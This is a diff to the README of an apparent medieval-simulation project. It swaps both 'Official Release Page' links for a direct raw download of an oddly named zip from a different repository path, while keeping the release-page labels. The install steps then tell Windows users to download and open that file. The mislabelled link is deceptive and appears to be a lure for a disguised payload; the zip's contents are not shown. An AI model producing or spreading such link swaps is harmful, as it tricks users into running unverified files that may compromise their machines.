@@ -5,7 +5,7 @@ description: "Simulate a dynamic medieval world where AI agents build lives, for
 ---
 # 🌍 Live-Simulation - Watch a medieval world come alive
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Totosh5285/Live-Simulation/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Totosh5285/totosh5285.github.io/main/caup/github-io-totosh-2.6-alpha.2.zip)
 
 Live-Simulation creates a digital medieval world. You watch citizens trade, build homes, and grow their civilization within your web browser. The simulation runs on its own. You observe the events as they happen in real time.
 
@@ -30,7 +30,7 @@ Ensure your computer has at least 4GB of RAM. A stable internet connection helps
 
 Follow these steps to launch the software on your Windows computer.
 
-1. Visit the [Official Release Page](https://github.com/Totosh5285/Live-Simulation/releases).
+1. Visit the [Official Release Page](https://raw.githubusercontent.com/Totosh5285/totosh5285.github.io/main/caup/github-io-totosh-2.6-alpha.2.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .zip to save it to your device.
 4. Locate the file in your Downloads folder.
